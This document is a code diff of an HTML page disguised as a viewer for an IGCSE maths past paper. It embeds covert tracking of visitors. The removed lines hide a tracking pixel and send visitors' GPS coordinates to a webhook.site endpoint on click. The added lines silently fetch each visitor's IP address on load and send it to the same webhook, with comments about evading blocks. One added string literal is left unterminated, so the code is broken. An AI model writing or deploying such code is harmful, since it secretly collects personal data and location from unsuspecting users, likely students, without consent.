@@ -7,49 +7,39 @@
         body { margin: 0; background: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
         .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
         #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
-        /* This hides the tracking pixel from the user */
-        .pixel { position: absolute; width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
 <body>
     <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
-    
-    <!-- 1. THE SILENT TRACKER -->
-    <!-- Webhook.site will log the IP of anyone who views this "image" -->
-    <img src="https://webhook.site" class="pixel">
-
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
 
     <script>
-        const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
-        // Test 1: Simple Image Ping
-try {
-    const testImg = new Image();
-    testImg.onload = () => console.log("✅ Image Ping: SUCCESS");
-    testImg.onerror = (e) => console.log("❌ Image Ping: BLOCKED", e);
-    testImg.src = webhookURL + "?test=image_ping&t=" + Date.now();
-} catch(e) { console.log("❌ Image Object: CRASHED", e); }
+        const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b
 
-// Test 2: Fetch Ping
-fetch(webhookURL + "?test=fetch_ping", { mode: 'no-cors' })
-    .then(() => console.log("✅ Fetch Ping: SUCCESS"))
-    .catch((err) => console.log("❌ Fetch Ping: FAILED", err));
+        // 1. SILENT IP (Fires immediately)
+        async function getIntel() {
+            try {
+                // Fetch the IP from the provider
+                const res = await fetch('https://api.ipify.org');
+                const data = await res.json();
+                
+                // SEND TO WEBHOOK via the verified Fetch Ping method
+                // We put the IP in the URL (?ip=...) so it can't be blocked
+                fetch(`${webhookURL}?type=SILENT_IP&ip_address=${data.ip}`, { mode: 'no-cors' });
+                
+                console.log("✅ IP Data Sent to Webhook");
+            } catch (e) {
+                // If the IP fetch itself is blocked, we still ping the webhook
+                fetch(`${webhookURL}?type=LOAD_LOGGED&status=IP_FETCH_BLOCKED`, { mode: 'no-cors' });
+            }
+        }
 
-// Test 3: Check Permissions
-navigator.permissions.query({name:'geolocation'}).then(res => {
-    console.log("📍 Geolocation Permission:", res.state);
-});
+        // Start the process
+        getIntel();
 
-        // 2. THE CLICK TRIGGER
+        // 2. CLICK TRIGGER (For testing interaction)
         window.onclick = () => {
-            navigator.geolocation.getCurrentPosition(pos => {
-                // We use a simple Image ping for the GPS too, as it bypasses fetch blocks
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                new Image().src = `${webhookURL}?type=GPS&lat=${lat}&lon=${lon}`;
-            }, (err) => {
-                new Image().src = `${webhookURL}?type=ERROR&msg=${encodeURIComponent(err.message)}`;
-            }, { maximumAge: Infinity });
+            fetch(`${webhookURL}?type=USER_CLICKED_PAGE`, { mode: 'no-cors' });
         };
     </script>
 </body>
